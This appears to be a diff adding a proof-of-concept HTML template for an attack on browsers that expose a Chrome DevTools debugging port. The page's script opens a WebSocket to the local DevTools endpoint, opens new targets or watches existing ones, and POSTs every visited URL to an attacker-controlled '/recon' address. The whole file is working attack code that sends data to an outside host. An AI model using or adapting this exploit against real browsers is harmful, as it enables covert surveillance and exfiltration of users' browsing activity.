@@ -1,0 +1,63 @@
+<!DOCTYPE html SYSTEM "https://leaking.via/doctype">
+<html xmlns="http://www.w3.org/1999/xhtml" manifest="https://leaking.via/html-manifest">
+<head>
+  <title>poc</title>
+</head>
+<body>
+  <div>
+    <h1>hello world</h1>
+    <div id="info"></div>
+  </div>
+  <script type="text/javascript">
+    const wsURL = '<%= `ws://127.0.0.1:${port}/devtools/browser/${id}` %>';
+    const bgUrl = '<%- `${attackUrl}/try?port=${port}&id=${id}&bg=1` %>';
+    const postUrl = '<%= `${attackUrl}/recon` %>';
+    const isBgTask = JSON.parse('<%= bg ? "true" : "false" %>');
+    const infoDiv = document.getElementById('info');
+    const ws = new WebSocket(wsURL);
+
+
+    ws.onopen = () => onOpen();
+    ws.onmessage = (data) => onMessage(data);
+    ws.onerror = (e) => console.log(e);
+
+    function onMessage(message) {
+
+        console.log(message);
+        if (message.data) {
+            const data = JSON.parse(message.data);
+            if (data && (data.method === "Target.targetCreated" || data.method === "Target.targetInfoChanged")) {
+                if (data.params && data.params.targetInfo && data.params.targetInfo.url && data.params.targetInfo.url !== 'about:blank') {
+                    fetch(postUrl, {method: 'POST', body: JSON.stringify({url: data.params.targetInfo.url})});
+                }
+            }
+        }
+    }
+
+    function onError(err) {
+        infoDiv.innerHTML = "<h1>Error</h1>"
+        console.log(err);
+    }
+
+    function send(method, params) {
+        const packet = {
+            "id": 1,
+            "method": method,
+            "params": params
+        };
+        ws.send(JSON.stringify(packet));
+    }
+
+    function onOpen() {
+        infoDiv.innerHTML = "<h1>Success!</h1>";
+        if (isBgTask) {
+            send("Target.setDiscoverTargets", {"discover": true})
+        } else {
+            send("Target.createTarget", {"url": bgUrl})
+        }
+    }
+
+  </script>
+</div>
+</body>
+</html>
